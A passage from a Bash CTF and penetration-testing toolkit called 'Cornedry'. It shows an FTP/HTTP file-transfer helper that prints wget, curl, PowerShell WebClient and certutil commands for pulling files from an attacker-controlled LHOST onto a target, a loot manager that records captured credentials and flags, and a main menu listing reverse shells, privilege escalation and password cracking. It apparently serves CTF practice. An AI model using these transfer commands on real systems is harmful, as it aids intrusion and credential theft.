server.serve_forever()
FTPSERVER
            
            pip3 install pyftpdlib 2>/dev/null
            echo -e "${BRIGHT_BLUE}[i]${RESET} FTP Server: ftp://user:pass@$CTF_LHOST:2121"
            python3 /tmp/ftp_server.py
            ;;
        4)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} Download Commands:\n"
            echo -e "${BRIGHT_YELLOW}Linux:${RESET}"
            echo "  wget http://$CTF_LHOST:8000/file"
            echo "  curl -O http://$CTF_LHOST:8000/file"
            echo ""
            echo -e "${BRIGHT_YELLOW}Windows:${RESET}"
            echo "  powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$CTF_LHOST:8000/file', 'file')\""
            echo "  certutil -urlcache -f http://$CTF_LHOST:8000/file file"
            echo ""
            ;;
    esac
    
    read -rp "Press Enter to continue..."
}

#=============================================================================
# NOTES & LOOT MANAGER
#=============================================================================
notes_manager() {
    show_banner
    echo -e "${BRIGHT_RED}"
    echo "      ╔═══════════════════════════════════════╗"
    echo "      ║  ${BRIGHT_BLUE}▓▒░   NOTES & LOOT   ░▒▓${BRIGHT_RED}     ║"
    echo "      ╚═══════════════════════════════════════╝"
    echo -e "${RESET}"
    
    echo -e "\n${BRIGHT_YELLOW}[1]${RESET} Add Quick Note"
    echo -e "${BRIGHT_YELLOW}[2]${RESET} Add Credentials"
    echo -e "${BRIGHT_YELLOW}[3]${RESET} Add Flag"
    echo -e "${BRIGHT_YELLOW}[4]${RESET} View All Notes"
    echo -e "${BRIGHT_YELLOW}[5]${RESET} View All Loot"
    echo -e "${BRIGHT_YELLOW}[6]${RESET} Export Report"
    echo -e "${BRIGHT_YELLOW}[0]${RESET} Back"
    echo ""
    
    read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
    
    case $choice in
        1)
            read -rp "Note: " note
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] $note" >> "$CTF_NOTES/quick_notes.txt"
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Note saved"
            ;;
        2)
            read -rp "Service/Target: " service
            read -rp "Username: " user
            read -rp "Password: " pass
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] $service - $user:$pass" >> "$CTF_LOOT/credentials.txt"
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Credentials saved"
            ;;
        3)
            read -rp "Flag: " flag
            read -rp "Challenge name: " challenge
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] $challenge: $flag" >> "$CTF_LOOT/flags.txt"
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Flag saved"
            ;;
        4)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} All Notes:"
            cat "$CTF_NOTES/quick_notes.txt" 2>/dev/null || echo "No notes yet"
            ;;
        5)
            echo -e "\n${BRIGHT_GREEN}[◆]${RESET} All Loot:\n"
            echo -e "${BRIGHT_YELLOW}Credentials:${RESET}"
            cat "$CTF_LOOT/credentials.txt" 2>/dev/null || echo "None"
            echo -e "\n${BRIGHT_YELLOW}Flags:${RESET}"
            cat "$CTF_LOOT/flags.txt" 2>/dev/null || echo "None"
            ;;
        6)
            report_file="$CTF_ROOT/CTF_Report_$(date +%Y%m%d_%H%M%S).txt"
            
            cat > "$report_file" << REPORT
================================================================
CTF REPORT - $(date '+%Y-%m-%d %H:%M:%S')
================================================================

TARGET: ${CTF_TARGET:-Not set}
LHOST: ${CTF_LHOST:-Not set}

================================================================
FLAGS CAPTURED
================================================================
$(cat "$CTF_LOOT/flags.txt" 2>/dev/null || echo "None")

================================================================
CREDENTIALS FOUND
================================================================
$(cat "$CTF_LOOT/credentials.txt" 2>/dev/null || echo "None")

================================================================
NOTES
================================================================
$(cat "$CTF_NOTES/quick_notes.txt" 2>/dev/null || echo "None")

================================================================
SESSION LOG
================================================================
$(cat "$CTF_LOGS/session.log" 2>/dev/null || echo "None")

================================================================
SCANS PERFORMED
================================================================
$(ls -lh "$CTF_SCANS" 2>/dev/null | tail -n +2 || echo "None")

================================================================
END OF REPORT
================================================================
REPORT
            
            echo -e "${BRIGHT_GREEN}[✓]${RESET} Report saved: $report_file"
            ;;
    esac
    
    read -rp "Press Enter to continue..."
}

#=============================================================================
# MAIN MENU
#=============================================================================
main_menu() {
    while true; do
        show_banner
        echo -e "${BRIGHT_RED}"
        echo "      ╔═══════════════════════════════════════════════════════════╗"
        echo "      ║${RESET}           ${BRIGHT_BLUE}▓▒░    Cornedry MAIN MENU    ░▒▓${BRIGHT_RED}           ║"
        echo "      ╚═══════════════════════════════════════════════════════════╝"
        echo -e "${RESET}"
        
        echo -e "        ${BRIGHT_YELLOW}[1]${RESET}  ${BRIGHT_BLUE}Quick Recon${RESET}           - Fast target enumeration"
        echo -e "        ${BRIGHT_YELLOW}[2]${RESET}  ${BRIGHT_BLUE}Web Exploitation${RESET}      - Web app attacks"
        echo -e "        ${BRIGHT_YELLOW}[3]${RESET}  ${BRIGHT_BLUE}Reverse Shells${RESET}        - Generate & catch shells"
        echo -e "        ${BRIGHT_YELLOW}[4]${RESET}  ${BRIGHT_BLUE}Privilege Escalation${RESET}  - PrivEsc tools"
        echo -e "        ${BRIGHT_YELLOW}[5]${RESET}  ${BRIGHT_BLUE}Password Cracking${RESET}     - Crack hashes & passwords"
        echo -e "        ${BRIGHT_YELLOW}[6]${RESET}  ${BRIGHT_BLUE}File Transfer${RESET}         - Setup servers"
        echo -e "        ${BRIGHT_YELLOW}[7]${RESET}  ${BRIGHT_BLUE}Notes & Loot${RESET}          - Manage findings"
        echo ""
        echo -e "        ${BRIGHT_YELLOW}[S]${RESET}  ${BRIGHT_BLUE}Set Target${RESET}"
        echo -e "        ${BRIGHT_YELLOW}[L]${RESET}  ${BRIGHT_BLUE}Set LHOST${RESET}"
        echo -e "        ${BRIGHT_YELLOW}[X]${RESET}  ${BRIGHT_RED}Exit${RESET}"
        echo ""
        
        read -rp "${BRIGHT_BLUE}$(whoami)@Cornedry${RESET}${BRIGHT_RED}>${RESET} " choice
        
        case $choice in
            1) quick_recon ;;
            2) web_exploit ;;
            3) reverse_shell_gen ;;
            4) priv_esc ;;
            5) password_crack ;;
            6) file_server ;;
            7) notes_manager ;;
            s|S) set_target ;;
            l|L) set_lhost ;;
            x|X)
                echo -e "\n${BRIGHT_RED}[◆]${RESET} Shutting down Cornedry..."
                log_action "Session ended"
                echo -e "${BRIGHT_BLUE}Good luck on your CTF!${RESET}\n"
                exit 0
                ;;
            *)
                echo -e "\n${BRIGHT_RED}[!]${RESET} Invalid choice"
                sleep 1
                ;;
        esac
    done
}

#=============================================================================
# INITIALIZATION
#=============================================================================
init_workspace
main_menu
